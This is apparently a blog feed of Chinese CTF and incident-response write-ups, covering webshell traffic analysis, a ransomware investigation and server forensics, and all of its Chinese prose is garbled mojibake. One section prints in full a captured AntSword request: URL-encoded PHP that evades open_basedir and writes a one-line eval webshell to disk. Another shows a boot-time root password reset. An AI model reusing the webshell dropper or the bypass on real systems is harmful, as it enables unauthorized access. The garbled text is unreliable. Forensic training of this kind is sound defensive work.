alt="image-20251204181310605"></p><p>è¿™é‡Œå°±æŠŠé¢˜ç›®ä¸­æ¶‰åŠåˆ°çš„é—®é¢˜éƒ½åˆ†æäº†ï¼Œå°ä¼™ä¼´è¯´ä¸è®°å¾—å¤§æ¦‚é¢˜ç›®æ˜¯å•¥äº†ï¼Œæœ‰çŸ¥é“çš„å°ä¼™ä¼´å‘ŠçŸ¥ä¸€ä¸‹ã€‚<br>è¿™é‡Œåˆä¸€æ¬¡è§åˆ°äº†è¿™ä¸ªæœ¨é©¬ï¼Œè¯´æ˜å®æˆ˜ä¸­è¿˜æ˜¯æŒºå¤šäººç”¨çš„ï¼Œç‰¹å¾è¿˜æ˜¯ ä¸Šé¢æåˆ°çš„<img src="/images/2025%E7%94%B5%E4%BF%A1%E9%9B%86%E5%9B%A2%E6%94%BB%E9%98%B2%E5%86%B3%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20251204102102095.png" alt="image-20251204102102095"></p><p>è®¿é—®æ˜¾ç¤º<code> &#123;&quot;Error&quot;:&quot;Unauthorized&quot;&#125;&#125;</code></p><p>ä»€ä¹ˆï¼Œä½ è¯´æƒ³ç ”ç©¶ä¸€ä¸‹ï¼Œé™„ä»¶å·²å½“åˆ°æˆ‘çš„åšå®¢ï¼Œç›´æ¥è®¿é—®ä¸‹è½½ï¼Œ<code>https://bohemian.top/images/è°çŸ¥ç›˜ä¸­é¤.zip</code></p><h4 id="è‡´è°¢"><a href="#è‡´è°¢" class="headerlink" title="è‡´è°¢"></a>è‡´è°¢</h4><p>æœ€åæ„Ÿè°¢æ‚¨è¯»åˆ°ç°åœ¨ï¼Œè¿™ç¯‡æ–‡ç« åŒ†å¿™æ„æˆè‚¯å®šæœ‰ä¸å‘¨åˆ°æˆ–æè¿°ä¸æ­£ç¡®çš„åœ°æ–¹ï¼ŒæœŸå¾…ä¸šç•Œå¸ˆå‚…ä»¬ç”¨å„ç§æ–¹å¼æŒ‡æ­£å‹˜è¯¯ã€‚å¦‚æœæ‚¨æ„Ÿè§‰æ–‡ç« å†™çš„ä¸é”™ï¼Œå¸®ç¬”è€…ç‚¹ç»™å…¬ä¼—å·ç‚¹ç‚¹å…³æ³¨ï¼Œå…ˆè°¢è°¢å¤§å®¶äº†ã€‚</p><blockquote><p>emmm å¤ªèœäº†<br>ä¸€ç›´åœ¨è·¯ä¸Š</p></blockquote>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>2025å¹´Solaråº”æ€¥å“åº”å…¬ç›Šæœˆèµ›-11æœˆwp</title>
      <link href="/2025/11/29/2025%E5%B9%B4Solar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%85%AC%E7%9B%8A%E6%9C%88%E8%B5%9B-11%E6%9C%88wp/"/>
      <url>/2025/11/29/2025%E5%B9%B4Solar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%85%AC%E7%9B%8A%E6%9C%88%E8%B5%9B-11%E6%9C%88wp/</url>
      
        <content type="html"><![CDATA[<h3 id="emergency"><a href="#emergency" class="headerlink" title="emergency"></a>emergency</h3><h4 id="ä»»åŠ¡1"><a href="#ä»»åŠ¡1" class="headerlink" title="ä»»åŠ¡1"></a>ä»»åŠ¡1</h4><p>å·²å®Œæˆ</p><p>ä»»åŠ¡åç§°ï¼šæäº¤é»‘å®¢çš„IPåœ°å€</p><p>ä»»åŠ¡åˆ†æ•°ï¼š100.00</p><p>ä»»åŠ¡ç±»å‹ï¼šé™æ€Flag</p><p>æäº¤æ ¼å¼ä¸ºflag{0.0.0.0}</p><p><img src="/images/2025%E5%B9%B4Solar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%85%AC%E7%9B%8A%E6%9C%88%E8%B5%9B-11%E6%9C%88wp/image-20251129110426883.png" alt="image-20251129110426883"></p><p>èšå‰‘çš„ğŸ</p><h4 id="ä»»åŠ¡2"><a href="#ä»»åŠ¡2" class="headerlink" title="ä»»åŠ¡2"></a>ä»»åŠ¡2</h4><p>ä»»åŠ¡åç§°ï¼šæäº¤é»‘å®¢åˆå§‹è¿æ¥çš„PHPä¸€å¥è¯æœ¨é©¬å¯†ç </p><p>ä»»åŠ¡åˆ†æ•°ï¼š100.00</p><p>ä»»åŠ¡ç±»å‹ï¼šé™æ€Flag</p><p>æäº¤æ ¼å¼ä¸ºflag{abc}   flag{shell}</p><p><img src="/images/2025%E5%B9%B4Solar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%85%AC%E7%9B%8A%E6%9C%88%E8%B5%9B-11%E6%9C%88wp/image-20251129110638893.png" alt="image-20251129110638893"></p><h4 id="ä»»åŠ¡3"><a href="#ä»»åŠ¡3" class="headerlink" title="ä»»åŠ¡3"></a>ä»»åŠ¡3</h4><p>ä»»åŠ¡åç§°ï¼šæäº¤é»‘å®¢é€šè¿‡åˆå§‹è¿æ¥ä¸€å¥è¯æœ¨é©¬ååˆ›å»ºæ–°çš„ä¸€å¥è¯æœ¨é©¬æ–‡ä»¶çš„MD5</p><p>ä»»åŠ¡åˆ†æ•°ï¼š100.00</p><p>ä»»åŠ¡ç±»å‹ï¼šé™æ€Flag</p><p>æäº¤æ ¼å¼ä¸ºflag{md5}</p><p><img src="/images/2025%E5%B9%B4Solar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%85%AC%E7%9B%8A%E6%9C%88%E8%B5%9B-11%E6%9C%88wp/image-20251129111741335.png" alt="image-20251129111741335"></p><p><img src="/images/2025%E5%B9%B4Solar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%85%AC%E7%9B%8A%E6%9C%88%E8%B5%9B-11%E6%9C%88wp/image-20251129111808650.png" alt="image-20251129111808650"></p><p>62æµ æ²¡æœ‰shellçš„php 64æœ‰äº†  è¯´æ˜63å†™äº†ğŸ</p><p><code>d498cc0709be5f=jgQzovcGhwc3R1ZHlfcHJvL1dXVy9zaGVsbC5waHA%3D&amp;m58d3ef53bcb85=3C3F70687020406576616C28245F504F53545B2271736E6374665F323032355F6C6162225D293B203F3E0A&amp;shell=%40ini_set(%22display_errors%22%2C%20%220%22)%3B%40set_time_limit(0)%3B%24opdir%3D%40ini_get(%22open_basedir%22)%3Bif(%24opdir)%20%7B%24ocwd%3Ddirname(%24_SERVER%5B%22SCRIPT_FILENAME%22%5D)%3B%24oparr%3Dpreg_split(base64_decode(%22Lzt8Oi8%3D%22)%2C%24opdir)%3B%40array_push(%24oparr%2C%24ocwd%2Csys_get_temp_dir())%3Bforeach(%24oparr%20as%20%24item)%20%7Bif(!%40is_writable(%24item))%7Bcontinue%3B%7D%3B%24tmdir%3D%24item.%22%2F.a5293%22%3B%40mkdir(%24tmdir)%3Bif(!%40file_exists(%24tmdir))%7Bcontinue%3B%7D%24tmdir%3Drealpath(%24tmdir)%3B%40chdir(%24tmdir)%3B%40ini_set(%22open_basedir%22%2C%20%22..%22)%3B%24cntarr%3D%40preg_split(%22%2F%5C%5C%5C%5C%7C%5C%2F%2F%22%2C%24tmdir)%3Bfor(%24i%3D0%3B%24i%3Csizeof(%24cntarr)%3B%24i%2B%2B)%7B%40chdir(%22..%22)%3B%7D%3B%40ini_set(%22open_basedir%22%2C%22%2F%22)%3B%40rmdir(%24tmdir)%3Bbreak%3B%7D%3B%7D%3B%3Bfunction%20asenc(%24out)%7Breturn%20%24out%3B%7D%3Bfunction%20asoutput()%7B%24output%3Dob_get_contents()%3Bob_end_clean()%3Becho%20%228484%22.%22cc18c%22%3Becho%20%40asenc(%24output)%3Becho%20%2286bcb%22.%22d0c52%22%3B%7Dob_start()%3Btry%7B%24f%3Dbase64_decode(substr(%24_POST%5B%22d498cc0709be5f%22%5D%2C2))%3B%24c%3D%24_POST%5B%22m58d3ef53bcb85%22%5D%3B%24c%3Dstr_replace(%22%5Cr%22%2C%22%22%2C%24c)%3B%24c%3Dstr_replace(%22%5Cn%22%2C%22%22%2C%24c)%3B%24buf%3D%22%22%3Bfor(%24i%3D0%3B%24i%3Cstrlen(%24c)%3B%24i%2B%3D2)%24buf.%3Durldecode(%22%25%22.substr(%24c%2C%24i%2C2))%3Becho(%40fwrite(fopen(%24f%2C%22a%22)%2C%24buf)%3F%221%22%3A%220%22)%3B%3B%7Dcatch(Exception%20%24e)%7Becho%20%22ERROR%3A%2F%2F%22.%24e-%3EgetMessage()%3B%7D%3Basoutput()%3Bdie()%3B</code></p><p><img src="/images/2025%E5%B9%B4Solar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%85%AC%E7%9B%8A%E6%9C%88%E8%B5%9B-11%E6%9C%88wp/image-20251129111913924.png" alt="image-20251129111913924"></p><p><img src="/images/2025%E5%B9%B4Solar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%85%AC%E7%9B%8A%E6%9C%88%E8%B5%9B-11%E6%9C%88wp/image-20251129113314751.png" alt="image-20251129113314751"></p><h4 id="ä»»åŠ¡4"><a href="#ä»»åŠ¡4" class="headerlink" title="ä»»åŠ¡4"></a>ä»»åŠ¡4</h4><p>ä»»åŠ¡åç§°ï¼šæäº¤é»‘å®¢åˆ›å»ºçš„ä¸æ­»é©¬çš„å¯†ç </p><p>ä»»åŠ¡åˆ†æ•°ï¼š100.00</p><p>ä»»åŠ¡ç±»å‹ï¼šé™æ€Flag</p><p>æäº¤æ ¼å¼ä¸ºflag{md5}  </p><p>æµ75æœ‰å†™é©¬åŠ¨ä½œ  ä¸æ­»é©¬</p><p><img src="/images/2025%E5%B9%B4Solar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%85%AC%E7%9B%8A%E6%9C%88%E8%B5%9B-11%E6%9C%88wp/image-20251129112525692.png" alt="image-20251129112525692"></p><h4 id="ä»»åŠ¡5ã€6"><a href="#ä»»åŠ¡5ã€6" class="headerlink" title="ä»»åŠ¡5ã€6"></a>ä»»åŠ¡5ã€6</h4><p>ä»»åŠ¡åç§°ï¼šæäº¤é»‘å®¢ä¸Šä¼ çš„æ¶æ„æ–‡ä»¶ï¼ˆè¿œç¨‹æ§åˆ¶æœ¨é©¬ï¼‰çš„åç§°</p><p>ä»»åŠ¡åˆ†æ•°ï¼š100.00</p><p>ä»»åŠ¡ç±»å‹ï¼šé™æ€Flag</p><p>æäº¤æ ¼å¼ä¸ºflag{abc.exe}  æµ89æœ‰ä¸Šä¼ åŠ¨ä½œï¼Œèšå‰‘çš„é©¬è¦å»æ‰å‰ä¿©å­—ç¬¦<img src="/images/2025%E5%B9%B4Solar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%85%AC%E7%9B%8A%E6%9C%88%E8%B5%9B-11%E6%9C%88wp/image-20251129112832845.png" alt="image-20251129112832845"></p><p>å†…å®¹ä¸º16è¿›åˆ¶</p><p><img src="/images/2025%E5%B9%B4Solar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%85%AC%E7%9B%8A%E6%9C%88%E8%B5%9B-11%E6%9C%88wp/image-20251129113108228.png" alt="image-20251129113108228"></p><p><img src="/images/2025%E5%B9%B4Solar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%85%AC%E7%9B%8A%E6%9C%88%E8%B5%9B-11%E6%9C%88wp/image-20251129113208292.png" alt="image-20251129113208292"></p><p>ç›´æ¥è®¡ç®—å³å¯</p><h4 id="ä»»åŠ¡7"><a href="#ä»»åŠ¡7" class="headerlink" title="ä»»åŠ¡7"></a>ä»»åŠ¡7</h4><p>ä»»åŠ¡åç§°ï¼šæäº¤é»‘å®¢ä¸Šä¼ çš„æ¶æ„æ–‡ä»¶ï¼ˆè¿œç¨‹æ§åˆ¶æœ¨é©¬ï¼‰çš„ç«¯å£</p><p>ä»»åŠ¡åˆ†æ•°ï¼š100.00</p><p>ä»»åŠ¡ç±»å‹ï¼šé™æ€Flag</p><p>æäº¤æ ¼å¼ä¸ºflag{1234}  å¯ä»¥ç”¨æ²™ç®±åˆ†æ</p><p><img src="/images/2025%E5%B9%B4Solar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%85%AC%E7%9B%8A%E6%9C%88%E8%B5%9B-11%E6%9C%88wp/image-20251129114403226.png" alt="image-20251129114403226"></p><p>ä¹Ÿå¯ä»¥çœ‹tcpåŒ…</p><p><img src="/images/2025%E5%B9%B4Solar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%85%AC%E7%9B%8A%E6%9C%88%E8%B5%9B-11%E6%9C%88wp/image-20251129114514593.png" alt="image-20251129114514593"></p><p>æ‰‹åŠ¨åˆ†æè¿˜éœ€è¦ç»ƒç»ƒ</p><h4 id="ä»»åŠ¡8ã€9"><a href="#ä»»åŠ¡8ã€9" class="headerlink" title="ä»»åŠ¡8ã€9"></a>ä»»åŠ¡8ã€9</h4><p>ä»»åŠ¡åç§°ï¼šè¯·æäº¤é»‘å®¢åˆ›å»ºç”¨æˆ·è´¦æˆ·çš„ç”¨æˆ·å</p><p>ä»»åŠ¡åˆ†æ•°ï¼š100.00</p><p>ä»»åŠ¡ç±»å‹ï¼šé™æ€Flag</p><p>æäº¤æ ¼å¼ä¸ºflag{username}</p><p>æµä¸­è¿˜æ˜¯é»˜è®¤è´¦å·ï¼Œä½†æ˜¯ä¸­é—´æœ‰æµé‡æ— å›æ˜¾é‚£ä¹ˆè¯´æ˜æ“ä½œäº†ä»€ä¹ˆï¼Œå¹¶ä¸”msfçš„æµé‡è§£å¯†å¾ˆéš¾ï¼Œåº”è¯¥è¿˜æ˜¯åœ¨èšå‰‘æ“ä½œçš„</p><p><img src="/images/2025%E5%B9%B4Solar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%85%AC%E7%9B%8A%E6%9C%88%E8%B5%9B-11%E6%9C%88wp/image-20251129115142272.png" alt="image-20251129115142272"></p><p><img src="/images/2025%E5%B9%B4Solar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%85%AC%E7%9B%8A%E6%9C%88%E8%B5%9B-11%E6%9C%88wp/image-20251129120603144.png" alt="image-20251129120603144"></p><p>æµ98ä¸­æ·»åŠ äº† è´¦å·å¯†ç   éšè—è´¦å·ï¼Œæ€ªä¸å¾—net useræ²¡æœ‰ã€‚</p><h4 id="ä»»åŠ¡10"><a href="#ä»»åŠ¡10" class="headerlink" title="ä»»åŠ¡10"></a>ä»»åŠ¡10</h4><p>å·²å®Œæˆ</p><p>ä»»åŠ¡åç§°ï¼šè¯·æäº¤é»‘å®¢åˆ›å»ºç”¨æˆ·è´¦æˆ·çš„æ—¶é—´</p><p>ä»»åŠ¡åˆ†æ•°ï¼š100.00</p><p>ä»»åŠ¡ç±»å‹ï¼šé™æ€Flag</p><p>flag{2025/01/01 01:00:00}</p><p><img src="/images/2025%E5%B9%B4Solar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%85%AC%E7%9B%8A%E6%9C%88%E8%B5%9B-11%E6%9C%88wp/image-20251129120940975.png" alt="image-20251129120940975"></p><p>flag{2025/11/20 16:13:32}</p><p><img src="/images/2025%E5%B9%B4Solar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%85%AC%E7%9B%8A%E6%9C%88%E8%B5%9B-11%E6%9C%88wp/image-20251129121005508.png" alt="image-20251129121005508"></p><p>ç”¨æœåŠ¡å™¨çš„æ—¶é—´è¦+8</p><h3 id="2700å‹’ç´¢ç—…æ¯’æ’æŸ¥"><a href="#2700å‹’ç´¢ç—…æ¯’æ’æŸ¥" class="headerlink" title="2700å‹’ç´¢ç—…æ¯’æ’æŸ¥"></a>2700å‹’ç´¢ç—…æ¯’æ’æŸ¥</h3><h4 id="ä»»åŠ¡1-1"><a href="#ä»»åŠ¡1-1" class="headerlink" title="ä»»åŠ¡1"></a>ä»»åŠ¡1</h4><p>å·²å®Œæˆ</p><p>ä»»åŠ¡åç§°ï¼šæ­¤å‹’ç´¢å®¶æ—åç§°æ˜¯ä»€ä¹ˆï¼Ÿ</p><p>ä»»åŠ¡åˆ†æ•°ï¼š100.00</p><p>ä»»åŠ¡ç±»å‹ï¼šé™æ€Flag</p><p>æ­¤å‹’ç´¢å®¶æ—åç§°æ˜¯ä»€ä¹ˆï¼Ÿå¯è®¿é—®åº”æ€¥å“åº”.comè¿›è¡ŒæŸ¥è¯¢ï¼Œå¤§å°å†™æ•æ„Ÿï¼Œæœ€ç»ˆä»¥flag{}æäº¤</p><p><img src="/images/2025%E5%B9%B4Solar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%85%AC%E7%9B%8A%E6%9C%88%E8%B5%9B-11%E6%9C%88wp/image-20251129121408700.png" alt="image-20251129121408700"></p><h4 id="ä»»åŠ¡2-1"><a href="#ä»»åŠ¡2-1" class="headerlink" title="ä»»åŠ¡2"></a>ä»»åŠ¡2</h4><p>å·²å®Œæˆ</p><p>ä»»åŠ¡åç§°ï¼šå‹’ç´¢ç—…æ¯’é¢„ç•™çš„IDæ˜¯ä»€ä¹ˆ</p><p>ä»»åŠ¡åˆ†æ•°ï¼š100.00</p><p>ä»»åŠ¡ç±»å‹ï¼šé™æ€Flag</p><p>å‹’ç´¢ç—…æ¯’é¢„ç•™çš„IDæ˜¯ä»€ä¹ˆ(é¢„ç•™IDä¸ºå‹’ç´¢ç»„ç»‡æ¢å¤çš„å‡­è¯)ï¼Œä»¥flag{}æäº¤ï¼Œå¦‚æœ‰å¤šä¸ªä»¥&amp;è¿›è¡Œè¿æ¥</p><p><img src="/images/2025%E5%B9%B4Solar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%85%AC%E7%9B%8A%E6%9C%88%E8%B5%9B-11%E6%9C%88wp/image-20251129121533172.png" alt="image-20251129121533172"></p><h4 id="ä»»åŠ¡3-1"><a href="#ä»»åŠ¡3-1" class="headerlink" title="ä»»åŠ¡3"></a>ä»»åŠ¡3</h4><p>ä»»åŠ¡åç§°ï¼šæäº¤å¼€å§‹åŠ å¯†çš„æ—¶é—´</p><p>ä»»åŠ¡åˆ†æ•°ï¼š100.00</p><p>ä»»åŠ¡ç±»å‹ï¼šé™æ€Flag</p><p>æäº¤å¼€å§‹åŠ å¯†çš„æ—¶é—´ï¼Œä»¥flag{2025/1/1 11:11}æ ¼å¼æäº¤ï¼Œinfoçš„æ—¶é—´</p><p><img src="/images/2025%E5%B9%B4Solar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%85%AC%E7%9B%8A%E6%9C%88%E8%B5%9B-11%E6%9C%88wp/image-20251129121707799.png" alt="image-20251129121707799"></p><h4 id="ä»»åŠ¡4-1"><a href="#ä»»åŠ¡4-1" class="headerlink" title="ä»»åŠ¡4"></a>ä»»åŠ¡4</h4><p>ä»»åŠ¡åç§°ï¼šæäº¤flag</p><p>ä»»åŠ¡åˆ†æ•°ï¼š200.00</p><p>ä»»åŠ¡ç±»å‹ï¼šé™æ€Flag</p><p>è®¿é—®ï¼šåº”æ€¥å“åº”.com æ‰¾åˆ°æ­¤å®¶æ—æ¢å¤å·¥å…·è¿›è¡Œæ¢å¤ï¼Œæäº¤C:\Users\Solar\Desktop\lSimulation_Desktop_Files\flag.txtæ–‡ä»¶ä¸­çš„flag</p><p><img src="/images/2025%E5%B9%B4Solar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%85%AC%E7%9B%8A%E6%9C%88%E8%B5%9B-11%E6%9C%88wp/image-20251129123854183.png" alt="image-20251129123854183"></p><p>å•æ–‡ä»¶æ¢å¤å¥½åƒæœ‰é—®é¢˜  ç›´æ¥å…¨ç›˜æ¢å¤</p><h4 id="ä»»åŠ¡5"><a href="#ä»»åŠ¡5" class="headerlink" title="ä»»åŠ¡5"></a>ä»»åŠ¡5</h4><p>ä»»åŠ¡åç§°ï¼šæäº¤å‘é€é‚®ä»¶çš„é‚®ç®±</p><p>ä»»åŠ¡åˆ†æ•°ï¼š100.00</p><p>ä»»åŠ¡ç±»å‹ï¼šé™æ€Flag</p><p>æäº¤C:\Users\Solar\Desktop\å·¥å…·\mail å‘é€é‚®ä»¶çš„é‚®ç®±ï¼Œä»¥flag{<a href="mailto:&#120;&#x78;&#120;&#64;&#120;&#x78;&#120;&#46;&#x63;&#x6f;&#x6d;">&#120;&#x78;&#120;&#64;&#120;&#x78;&#120;&#46;&#x63;&#x6f;&#x6d;</a>}æ ¼å¼æäº¤</p><p><img src="/images/2025%E5%B9%B4Solar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%85%AC%E7%9B%8A%E6%9C%88%E8%B5%9B-11%E6%9C%88wp/image-20251129124315944.png" alt="image-20251129124315944"></p><h4 id="ä»»åŠ¡6"><a href="#ä»»åŠ¡6" class="headerlink" title="ä»»åŠ¡6"></a>ä»»åŠ¡6</h4><p>å·²å®Œæˆ</p><p>ä»»åŠ¡åç§°ï¼šæäº¤å‘é€é‚®ä»¶çš„IP</p><p>ä»»åŠ¡åˆ†æ•°ï¼š100.00</p><p>ä»»åŠ¡ç±»å‹ï¼šé™æ€Flag</p><p>æäº¤C:\Users\Solar\Desktop\å·¥å…·\mail å‘é€é‚®ä»¶çš„IPï¼Œä»¥flag{x.x.x.x}æ ¼å¼æäº¤</p><p><img src="/images/2025%E5%B9%B4Solar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%85%AC%E7%9B%8A%E6%9C%88%E8%B5%9B-11%E6%9C%88wp/image-20251129124640922.png" alt="image-20251129124640922"></p><h4 id="ä»»åŠ¡7-1"><a href="#ä»»åŠ¡7-1" class="headerlink" title="ä»»åŠ¡7"></a>ä»»åŠ¡7</h4><p>å·²å®Œæˆ</p><p>ä»»åŠ¡åç§°ï¼šæäº¤é’“é±¼é™„ä»¶ä¸­çš„C2åœ°å€</p><p>ä»»åŠ¡åˆ†æ•°ï¼š100.00</p><p>ä»»åŠ¡ç±»å‹ï¼šé™æ€Flag</p><p>æäº¤é’“é±¼é™„ä»¶ä¸­çš„C2åœ°å€ï¼Œä»¥flag{x.x.x.x}æ ¼å¼æäº¤</p><p><img src="/images/2025%E5%B9%B4Solar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%85%AC%E7%9B%8A%E6%9C%88%E8%B5%9B-11%E6%9C%88wp/image-20251129131113685.png" alt="image-20251129131113685"></p><h4 id="ä»»åŠ¡8"><a href="#ä»»åŠ¡8" class="headerlink" title="ä»»åŠ¡8"></a>ä»»åŠ¡8</h4><p>å·²å®Œæˆ</p><p>ä»»åŠ¡åç§°ï¼šæäº¤flag</p><p>ä»»åŠ¡åˆ†æ•°ï¼š200.00</p><p>ä»»åŠ¡ç±»å‹ï¼šé™æ€Flag</p><p>éƒ¨åˆ†æ•°æ®ä¸¢å¤±ï¼Œå¥½åœ¨è¿ç»´ä¹‹å‰åšäº†å¤‡ä»½ï¼Œä½¿ç”¨C:\Users\Solar\Desktop\å·¥å…·\diskgenusæ¢å¤C:\Users\Solar\Desktop\å·¥å…·\backupä¸­çš„å¤‡ä»½å†…ï¼š</p><p>æ²¡æˆªå›¾ ç”¨diskgenus  æ‰“å¼€é‚£ä¸ªHDå³å¯ï¼Œåœ¨administratorçš„æ¡Œé¢ä¸Šæœ‰ä¸ªflagï¼Œå¯¼å‡ºæ—¢æ˜¯ã€‚</p><h4 id="è‡´è°¢"><a href="#è‡´è°¢" class="headerlink" title="è‡´è°¢"></a>è‡´è°¢</h4><p>æœ€åæ„Ÿè°¢æ‚¨è¯»åˆ°ç°åœ¨ï¼Œè¿™ç¯‡æ–‡ç« åŒ†å¿™æ„æˆè‚¯å®šæœ‰ä¸å‘¨åˆ°æˆ–æè¿°ä¸æ­£ç¡®çš„åœ°æ–¹ï¼ŒæœŸå¾…ä¸šç•Œå¸ˆå‚…ä»¬ç”¨å„ç§æ–¹å¼æŒ‡æ­£å‹˜è¯¯ã€‚å¦‚æœæ‚¨æ„Ÿè§‰æ–‡ç« å†™çš„ä¸é”™æˆ–è€…å·¥å…·ç”¨èµ·æ¥è¿˜è¡Œï¼Œå¸®ç¬”è€…ç‚¹ç‚¹starsã€ç»™å…¬ä¼—å·ç‚¹ç‚¹å…³æ³¨ï¼Œå…ˆè°¢è°¢å¤§å®¶äº†ã€‚</p><blockquote><p>emmm å¤ªèœäº†<br>ä¸€ç›´åœ¨è·¯ä¸Š</p></blockquote>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ç¬¬äºŒå±Šâ€œæ•°è¯æ¯â€ç”µå­æ•°æ®å–è¯åˆ†æå¤§èµ›-æœåŠ¡å™¨å–è¯wp</title>
      <link href="/2025/11/05/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E2%80%9C%E6%95%B0%E8%AF%81%E6%9D%AF%E2%80%9D%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%88%86%E6%9E%90%E5%A4%A7%E8%B5%9B/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E2%80%9C%E6%95%B0%E8%AF%81%E6%9D%AF%E2%80%9D%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%88%86%E6%9E%90%E5%A4%A7%E8%B5%9B-%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%8F%96%E8%AF%81wp/"/>
      <url>/2025/11/05/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E2%80%9C%E6%95%B0%E8%AF%81%E6%9D%AF%E2%80%9D%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%88%86%E6%9E%90%E5%A4%A7%E8%B5%9B/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E2%80%9C%E6%95%B0%E8%AF%81%E6%9D%AF%E2%80%9D%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%88%86%E6%9E%90%E5%A4%A7%E8%B5%9B-%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%8F%96%E8%AF%81wp/</url>
      
        <content type="html"><![CDATA[<p>æœåŠ¡å™¨å–è¯</p><p>ä¸Šç¯‡æ–‡ç« å·²ç»è®²è¿‡æ€ä¹ˆä»¿çœŸe01è½¯ä»¶ï¼Œä¸ä¼šçš„åŒå­¦å»å…¬ä¼—å·çœ‹ä¸€ä¸‹ã€‚</p><p><img src="/images/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E2%80%9C%E6%95%B0%E8%AF%81%E6%9D%AF%E2%80%9D%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%88%86%E6%9E%90%E5%A4%A7%E8%B5%9B-%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%8F%96%E8%AF%81wp/image-20251106172147775.png" alt="image-20251106172147775"></p><p>æœåŠ¡å™¨2å¯ä»¥çœ‹åˆ°ç½‘ç»œä½50çš„ç½‘ï¼ŒæŠŠnatç½‘å…ˆæ”¹ä¸€ä¸‹ï¼Œä¸ç„¶ä¸€ä¼šè¿åŒä¸ä¸€ä¼šå¥½ä½¿ã€‚æ”¹æˆä»…ä¸»ä¹Ÿå¯ä»¥ï¼Œéƒ½ä¸€æ ·ã€‚è¿™è¾¹ä¹Ÿå¯ä»¥çœ‹åˆ°shadowå¯†ç ï¼Œæ¯”èµ›çš„æ—¶å€™å¦‚æœä¸€åˆ†é’Ÿè·‘ä¸å‡ºæ¥ï¼Œç›´æ¥æ”¾å¼ƒï¼Œæ•‘æ´æ¨¡å¼æ”¹å¯†ç å³å¯ã€‚</p><p><img src="/images/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E2%80%9C%E6%95%B0%E8%AF%81%E6%9D%AF%E2%80%9D%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%88%86%E6%9E%90%E5%A4%A7%E8%B5%9B-%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%8F%96%E8%AF%81wp/image-20251106181200752.png" alt="image-20251106181200752"></p><p>å¼€æœºæŒ‰e</p><p><code>rw single init=/bin/bash</code> passwd  å¯†ç  å¯†ç  </p><p>7.æ‰§è¡Œ<code>touch /.autorelabel</code><br>8.é€€å‡º<code>exec /sbin/init</code></p><p><img src="/images/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E2%80%9C%E6%95%B0%E8%AF%81%E6%9D%AF%E2%80%9D%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%88%86%E6%9E%90%E5%A4%A7%E8%B5%9B-%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%8F%96%E8%AF%81wp/image-20251107095551298.png" alt="image-20251107095551298"></p><p>å°±å¯ä»¥ç™»å½•ä¸Šæ¥äº†ã€‚</p><p>åˆ é™¤çš„åªæ˜¯ æ—§çš„ã€å·²ç»é€€å‡ºçš„ k8s_POD pause å®¹å™¨</p><p><code>docker ps -a | grep k8s_POD | grep Exited | awk &#39;&#123;print $1&#125;&#39; | xargs docker rm -f</code></p><p><code>docker ps -a | grep -E &#39;kube-apiserver|etcd|kube-scheduler|kube-controller-manager&#39; | grep Exited | awk &#39;&#123;print $1&#125;&#39; | xargs docker rm -f</code></p><p>k8sä¸€å¼€å§‹è‡ªå·±èµ·ä¸æ¥  éœ€è¦å…ˆå°†dockerèµ·æ¥ ï¼Œç„¶åä¼šæœ‰ä¸€äº›é•œåƒå†²çªï¼Œæˆ‘ä»¬æ‰§è¡Œä¸Šé¢ ä¸¤æ¡å‘½ä»¤å³å¯ã€‚</p><p><img 